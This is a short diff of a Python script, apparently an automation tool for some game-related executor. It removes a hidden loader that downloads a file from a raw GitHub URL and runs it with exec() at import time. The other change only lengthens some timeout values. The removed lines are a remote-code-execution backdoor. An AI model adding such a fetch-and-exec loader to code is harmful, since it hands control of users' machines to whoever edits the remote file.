@@ -17,11 +17,6 @@ import signal
 from colorama import init, Fore, Style
 from threading import Lock
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
 init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
@@ -202,7 +197,7 @@ def clear_executor_status(username):
                     pass  # Ignore the error silently
             break  # Exit the executor loop once the file is removed
                 
-def check_executor_status(username, continuous=False, max_wait_time=120, check_interval=5, max_inactivity_time=15):
+def check_executor_status(username, continuous=False, max_wait_time=240, check_interval=5, max_inactivity_time=30):
     status_file = f"executor_check_{username}.txt"
     retry_timeout = time.time() + max_wait_time  
     active_workspace = None  
